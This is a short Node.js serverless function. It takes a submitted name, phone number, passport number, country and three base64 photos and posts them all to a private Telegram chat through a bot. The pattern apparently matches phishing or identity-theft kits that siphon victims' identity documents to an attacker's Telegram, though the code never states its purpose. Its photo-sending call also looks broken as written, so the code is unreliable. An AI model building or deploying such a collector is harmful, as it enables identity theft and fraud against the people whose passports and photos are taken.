const fetch = require("node-fetch");

exports.handler = async (event) => {
  try {
    const data = JSON.parse(event.body);

    const BOT = "PUT_YOUR_BOT_TOKEN_HERE";
    const CHAT = "PUT_YOUR_CHAT_ID_HERE";

    const text = `
New User:
Name: ${data.name}
Phone: ${data.phone}
Passport: ${data.passport}
Country: ${data.country}
`;

    // 🧾 TEXT
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({
        chat_id: CHAT,
        text: text
      })
    });

    // 📸 3 PHOTOS
    const photos = [
      data.photo1,
      data.photo2,
      data.photo3
    ];

    for (let p of photos) {
      await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
          chat_id: CHAT,
          photo: `data:image/jpeg;base64,${p}`
        })
      });
    }

    return {
      statusCode: 200,
      body: "OK"
    };

  } catch (err) {
    console.log(err);
    return {
      statusCode: 500,
      body: "Error"
    };
  }
};
